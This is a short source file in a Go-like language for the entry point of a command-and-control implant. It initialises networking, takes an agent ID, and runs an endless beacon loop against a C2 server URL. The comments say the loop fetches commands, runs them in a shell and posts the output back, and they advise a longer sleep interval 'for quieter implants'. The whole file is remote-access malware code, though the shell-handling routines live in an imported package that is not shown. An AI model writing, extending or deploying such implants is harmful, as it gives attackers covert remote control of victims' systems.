package main

import (
    "std/runtime"
    "std/file"
    "std/time"
    "std/net"
    "c2"
)

fn main(stackHint: *void) -> u64 {
    if !runtime.Init(stackHint) {
        return 1
    }
    if net.Init() != 0 {
        return 2
    }

    // Cleartext HTTP only (std/net has no TLS).
    var c2Base: *u8 = "http://127.0.0.1:8080"

    id, err := c2.GetAgentID()
    if err != 0 {
        return 3
    }

    // Beacon loop: GET /v1/terminal/{id} -> shell -> POST output -> sleep.
    // Poll every 3s (raise for quieter implants).
    for true {
        c2.PollTerminal(c2Base, id)
        time.Sleep(3 * time.Second)
    }

    return 0
}
